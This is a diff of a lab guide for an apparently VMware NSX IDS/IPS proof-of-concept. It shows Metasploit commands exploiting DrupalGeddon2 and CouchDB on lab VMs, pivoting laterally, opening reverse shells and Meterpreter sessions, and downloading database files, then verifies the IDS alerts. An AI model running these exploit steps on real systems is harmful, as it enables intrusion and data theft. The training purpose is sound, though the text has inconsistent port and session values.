@@ -11,7 +11,7 @@ In this exercise, we will again establish a **reverse shell** from the Drupal se
 2. **Alternatively**, if your computer does not have access to the **External VM** directly, you can access the VM console from the  physical environment vCenter Web-UI. 
 
 **Initiate DrupalGeddon2 attack against the App1-WEB-TIER VM (again)**
-1.	Type **sudo msfconsole** to launch **Metasploit**. Follow the below steps to initiate the exploit. Hit **enter** between every step. 
+1.	Type **sudo msfconsole** to launch **Metasploit**. Enter **VMware1!** if prompted for a password. Follow the below steps to initiate the exploit. Hit **enter** between every step. 
     * Type **use exploit/unix/webapp/drupal_drupalgeddon2** to select the drupalgeddon2 exploit module
     * Type **set RHOST 192.168.10.101** to define the IP address of the victim to attack. The IP address should match the IP address of **App1-WEB-TIER VM**
     * Type **set RPORT 8080** to define the port the vulnerable Drupal service runs on. 
@@ -44,8 +44,8 @@ msf5 exploit(unix/webapp/drupal_drupalgeddon2) > route add 192.168.20.0/24 1
 **Initiate CouchDB Command Execution attack against App1-APP-TIER VM**
 1.	Using the already open Metasploit console, follow the below steps to initiate the exploit. Hit **enter** between every step. 
     * Type **use exploit/linux/http/apache_couchdb_cmd_exec** to select the CouchDB Command Execution exploit module
-    * Type **set RHOST 192.168.20.100** to define the IP address of the victim to attack. The IP address should match the IP address of **App1-APP-TIER VM**. (check the NSX VM Inventory to confirm)+
-    * Type **set LHOST 10.114.209.151* to define the IP address of the local attacker machine. The IP address should match the IP address of **EXTERNAL VM**. (This IP will be different in your environment !. You can run **ifconfig** to determine this IP)
+    * Type **set RHOST 192.168.20.100** to define the IP address of the victim to attack. The IP address should match the IP address of **App1-APP-TIER VM**. (check the NSX VM Inventory to confirm)
+    * Type **set LHOST 10.114.209.151** to define the IP address of the local attacker machine. The IP address should match the IP address of **EXTERNAL VM**. (This IP will be different in your environment !. You can run **ifconfig** to determine this IP)
     * Type **set LPORT 4445** to define the local port to use. The reverse shell will be established to this local port
     * Type **exploit** to initiate the exploit and esbalish a command shell
 ```console
@@ -146,7 +146,7 @@ Process List
 ```
 > **Note**: The VMs deployed in this lab run Drupal and CouchCB services as containers (built using Vulhub). The establshed session puts you into the container **cve201712635_couchdb_1** container shell.
 
-6.	Now we can pivot the attack and laterally move to other application VM deployed in the same network segment as **App1-APP-TIER VM**. We will will use the same **apache_couchdb_cmd_exec** exploit to  the **App2-APP-TIER VM** on the internal network, which also is running a vulnerable **CouchDB** Service. 
+6.	Now we can pivot the attack once more and laterally move to other application VM deployed in the same network segment as **App1-APP-TIER VM**. We will will use the same **apache_couchdb_cmd_exec** exploit to  the **App2-APP-TIER VM** on the internal network, which also is running a vulnerable **CouchDB** Service. 
 
 **Initiate CouchDB Command Execution attack against App2-APP-TIER VM through App-1-APP-TIER VM**
 1.	Using the already open Metasploit console, follow the below steps to initiate the exploit. Hit **enter** between every step. 
@@ -154,7 +154,7 @@ Process List
     * Type **route add 192.168.20.101/32 3** to route traffic to the **App2-APP-TIER VM** through the previusly established meterpreter session. The IP address specified should be the IP address of the **App2-APP-TIER VM**
     * Type **use exploit/linux/http/apache_couchdb_cmd_exec** to select the CouchDB Command Execution exploit module
     * Type **set RHOST 192.168.20.101** to define the IP address of the victim to attack. The IP address should match the IP address of **App2-APP-TIER VM**. (check the NSX VM Inventory to confirm)+
-    * Type **set LHOST 10.114.209.151* to define the IP address of the local attacker machine. The IP address should match the IP address of **EXTERNAL VM**. (This IP will be different in your environment !. You can run **ifconfig** to determine this IP)
+    * Type **set LHOST 10.114.209.151** to define the IP address of the local attacker machine. The IP address should match the IP address of **EXTERNAL VM**. (This IP will be different in your environment !. You can run **ifconfig** to determine this IP)
     * Type **set LPORT 4446** to define the local port to use. The reverse shell will be established to this local port
     * Type **exploit** to initiate the exploit and esbalish a command shell
 ```console
@@ -168,8 +168,8 @@ msf5 exploit(linux/http/apache_couchdb_cmd_exec) > set RHOST 192.168.20.101
 RHOST => 192.168.20.100
 msf5 exploit(linux/http/apache_couchdb_cmd_exec) > set LHOST 10.114.209.151
 LHOST => 10.114.209.151
-msf5 exploit(linux/http/apache_couchdb_cmd_exec) > set LPORT 4445
-LPORT => 4445
+msf5 exploit(linux/http/apache_couchdb_cmd_exec) > set LPORT 4446
+LPORT => 4446
 msf5 exploit(linux/http/apache_couchdb_cmd_exec) > exploit
 ```
 2. Confirm the vulnerable server was sucessfully exploited and a **shell** reverse TCP session was established from **App2-APP-TIER VM** back to the **Extermal VM**
@@ -193,7 +193,7 @@ msf5 exploit(linux/http/apache_couchdb_cmd_exec) > exploit
     * Type **exploit** to establish the session
 ```console
 background
-Background session 2? [y/N]  y
+Background session 4? [y/N]  y
 msf5 exploit(linux/http/apache_couchdb_cmd_exec) > use multi/manage/shell_to_meterpreter
 msf5 post(multi/manage/shell_to_meterpreter) > set LPORT 8082
 LPORT => 8081
@@ -201,7 +201,20 @@ msf5 post(multi/manage/shell_to_meterpreter) > set session 4
 session => 4
 msf5 post(multi/manage/shell_to_meterpreter) > exploit
 ```
-4. You can now interact with the Meterpreter session. For instance, you can run the below commands to gain more inforation on the exploited **App2-APP-TIER VM**
+4. Confirm a **Meterpreter** reverse TCP session was established from **App2-APP-TIER VM** back to the **Extermal VM** and interact with the session. You may see 2 Meterpreter sessions get established. 
+```console
+[*] Upgrading session ID: 4
+[*] Starting exploit/multi/handler
+[*] Started reverse TCP handler on 10.114.209.151:8082
+[*] Sending stage (980808 bytes) to 10.114.209.148
+[*] Meterpreter session 5 opened (10.114.209.151:8082 -> 10.114.209.148:15262) at 2020-07-29 09:45:08 -0500
+[*] Sending stage (980808 bytes) to 10.114.209.148
+[*] Meterpreter session 6 opened (10.114.209.151:8082 -> 10.114.209.148:12896) at 2020-07-29 09:45:12 -0500
+[*] Command stager progress: 100.00% (773/773 bytes)
+[*] Post module execution completed
+```
+
+5. You can now interact with the Meterpreter session. For instance, you can run the below commands to gain more inforation on the exploited **App2-APP-TIER VM**
     * Type **sessions -l** to see all established sessions
 ```console
 msf5 post(multi/manage/shell_to_meterpreter) > sessions -l
@@ -210,8 +223,6 @@ msf5 post(multi/manage/shell_to_meterpreter) > sessions -l
    * You can now run commands as in the previous exercise to gain more information about the **App2-APP-TIER VM**, retrieve or destroy data. 
    * Type **ls /opt/couchdb/data** to see CouchDB database files   
    * Type **download /opt/couchdb/data** to see CouchDB database files
-
-
 ```console
 
 meterpreter > ls /opt/couchdb/data
@@ -240,7 +251,7 @@ meterpreter > download /opt/couchdb/data/
 ```
 This completes the lateral movement attack scenario. Now we will go back to NSX manager and investigat this attack. Skip the below step #5 if you have gone through the manaul attack steps above.
 
-5. If you prefer not to manually go through this attack scenario, using the above steps, you can instead run the pre-defined attack script by running **sudo ./attack2.sh**. Before you execute the script, use **sudo nano attack1.rc** and replace the RHOST and LHOST IP addresses accordingly to match with the IP addresses in your environment. 
+6. If you prefer not to manually go through this attack scenario, using the above steps, you can instead run the pre-defined attack script by running **sudo ./attack2.sh**. Before you execute the script, use **sudo nano attack1.rc** and replace the RHOST and LHOST IP addresses accordingly to match with the IP addresses in your environment. 
 **RHOST** on line 3 should be the IP address of the **App1-WEB-TIER VM**
 **SUBNET** on line 6 (route add) should be the **Internal Network** subnet
 **LHOST** on line 9 should be the IP address of the **External VM** (this local machine)
@@ -253,10 +264,45 @@ This completes the lateral movement attack scenario. Now we will go back to NSX 
 **Confirm IDS/IPS Events show up in the NSX Manager UI**
 1.	In the NSX Manager UI, navigate to Security -->  Security Overview
 2. Under the **Insights** tab, confirm you see a number of attempted intrusion against the  **APP-1-WEB-TIER** workload
-![](Images/IDPS_POC_13.PNG)
-3. Click  **APP-1-WEB-TIER** to open a filtered event view for this workload. 
-4. Confirm 2 signatures have fired; one exploit-specific signature for **DrupalGeddon2** and one broad signature indicating the use of a **Remote Code execution via a PHP script**
-![](Images/IDPS_POC_14.PNG)
+![](assets/images/IDPS_POC_18.PNG)
+3. Navigate to Security --> East West Security --> Distributed IDS
+4. Confirm 4 signatures have fired:
+    * Signature for **DrupalGeddon2**, with **APP-1-WEB-TIER** as Affected VM
+    * Signature for **Remote Code execution via a PHP script**, with **APP-1-WEB-TIER** as Affected VM
+    * Signature for **Apache CouchDB Remote Code Execution**, with **APP-1-WEB-TIER**, **APP-1-APP-TIER**, **APP-2-APP-TIER** as Affected VMs
+    * Signature for **Apache CouchDB Remote Privilege Escalation**, with **APP-1-WEB-TIER**, **APP-1-APP-TIER**, **APP-2-APP-TIER** as Affected VMs
+    
+    ![](assets/images/IDPS_POC_20.PNG)
+
+> **Note**: Events are ordered based on the time a particular signature last fired. The last event is at the top of the table.
+
+5. Now you can drill down into these events. Click the **>** symbol to the left of the **ET WEB_SPECIFIC_APPS [PT OPEN] Drupalgeddon2 <8.3.9 <8.4.6 <8.5.1 RCE Through Registration Form (CVE-2018-7600)** event near the bottom of the table to expand this event. 
+    * Confirm that the IP addresses of the attacker and victim match with the **External VM** and **APP-1-WEB-TIER VM** respectlively.
+    * click **View Intrusion History** to see details about the exploit attempts. You may see multiple attemts (from different ports) as Metasploit initiated multiple connections
+    * this event contains vulnerability details including the **CVSS score** and **CVE ID**. Click the **2018-7600** CVE link to open up the **Mitre** CVE page and learn more about the vulnerability.
+6. **Optionally**, you can check the  obove details as well for the secondary event (except for the vulnerability details, which are not applicable to this more general signature)
+7. Now we can look at the **CouchDB** exploit, which we used to move laterally from **APP-1-WEB-TIER** to **APP-1-APP-TIER** and from **APP-1-APP-TIER**  to **APP-2-APP-TIER**. 
+8. Click the **>** symbol to the left of the **SLR Alert - Apache CouchDB Remote Privilege Escalation (CVE-2017-12635)** event
+    * Confirm that the IP addresses of the attacker and victim match with the **APP-1-APP-TIER VM** and **APP-2-APP-TIER VM** respectlively. This represents the last time this particular signature fired. 
+    * click **View Intrusion History** to see details about the exploit attempts. You should be able to conirm that first this exploit was used to move the attack from **APP-1-WEB-TIER (192.168.10.101)** to **APP-1-APP-TIER (192.168.20.100) ** and then from **APP-1-APP-TIER**  to **APP-2-APP-TIER (192.168.20.101)**. 
+  
+![](assets/images/IDPS_POC_19.PNG)
+
+> **Note**: You will see 2 log entries for each connection, because the Distributed IDS/IPS has been enabled on both source and destination. 
+
+9. Click the **>** symbol to the left of the **ET WEB_SPECIFIC_APPS Apache CouchDB Remote Code Execution 1** event. Conirm the instrusion history matches the one of the event you previously looked at. 
+10. Now you can apply a wide array of filter criteria in order to only look at specific events. Use the checkboxes and filter to zoom in to specifc events:
+     * Only look at **Critical Severity** level events. There should only be one.
+     * Only look at events related to the the **APP-1-APP-TIER** VM. There should be 4 as this VM was the initial target as well as the pivot of an attack.
+     * Only look at events with a **CVSS Score** of **9 and above**. There should be 3.
+     * Only look at events where the **affected product** is **Drupal Service**. There should be 1.
+     * Only look at events related to the **APP-1-APP-TIER** where the **CVSS** is **9 and above*. There should be 2.
+
+You have now successfully completed a lateral attack scenario ! 
+In the next (optional) exercise, we will configure some more advanced settings such as **signature exclusions/false positive tuning** and the ability to send IDS/IPS logs directly a SIEM from every host.
+
+
+Before moving to the next exercise, folow [these instructions](/docs/ClearingIDSEvents.md) to clear the IDS events from NSX Manager
 
 ---
 
